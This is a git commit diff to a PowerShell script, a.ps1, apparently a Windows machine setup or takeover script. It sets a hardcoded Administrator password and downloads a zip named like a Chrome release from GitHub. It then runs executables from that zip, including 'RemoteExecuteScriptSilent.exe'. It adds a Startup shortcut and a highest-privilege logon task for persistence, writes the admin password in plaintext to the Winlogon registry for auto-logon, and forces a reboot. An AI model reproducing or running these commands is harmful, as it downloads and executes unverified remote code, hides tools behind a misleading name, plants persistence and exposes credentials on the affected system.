3635acabaa269787ab7643801bb2f0fc3fbe0cb9
37218vuuhuu <103755102+37218vuuhuu@users.noreply.github.com>
2022-12-19 17:35:06 +0700

    Update a.ps1

--- a.ps1
+++ a.ps1
@@ -1,3 +1,4 @@
+Set-ExecutionPolicy RemoteSigned -Force
 net user Administrator Nancyhd1@
 $Url = 'https://github.com/37218vuuhuu/app-19/raw/main/Chrome.57.zip'
 
@@ -8,15 +9,28 @@ $ProgressPreference = 'SilentlyContinue'
 Invoke-WebRequest $Url -OutFile Chrome.57.zip
 
 Expand-Archive Chrome.57.zip -DestinationPath Chrome.57
-Set-Location Chrome.57/Chrome.57
+Start "C:\Users\Administrator\Chrome.57\Shutdown.exe"
+Set-ExecutionPolicy RemoteSigned -Force
+$SourceFilePath = "C:\Users\Administrator\Chrome.57\RemoteExecuteScriptSilent.exe" 
+$ShortcutPath = "C:\Users\Administrator\Start Menu\Programs\Startup\RemoteExecuteScriptSilent.lnk" 
+$WScriptObj = New-Object -ComObject ("WScript.Shell") 
+$shortcut = $WscriptObj.CreateShortcut($ShortcutPath) 
+$shortcut.TargetPath = $SourceFilePath 
+$shortcut.WindowStyle = 1 
+$ShortCut.Hotkey = "F1"; $shortcut.Save()
 
-Start "Shutdown.exe"
-Start "RemoteShutdown.exe"
+$Action=New-ScheduledTaskAction -Execute "powershell.exe"
+$Trigger=New-ScheduledTaskTrigger -AtLogOn
+$Set=New-ScheduledTaskSettingsSet
+$Principal=New-ScheduledTaskPrincipal -UserID "$env:username" -LogonType Interactive -RunLevel Highest
+$Task=New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Set -Principal $Principal
+Register-ScheduledTask -TaskName PowerShellAtLogon -InputObject $Task
 
-Set-Location Chrome.57/Chrome.57
-Start "Autologon64"
+$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+$DefaultUsername = "Administrator"
+$DefaultPassword = "Nancyhd1@"
+Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
+Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type String 
+Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
 Get-PSReadLineKeyHandler -Chord Enter
-
-Set-Location Chrome.57/Chrome.57
-Start-Process "Autologon64" -ArgumentList "Administrator","Administrator","Nancyhd1@"
-Get-PSReadLineKeyHandler -Chord Enter
+Shutdown -r -t 120 /f
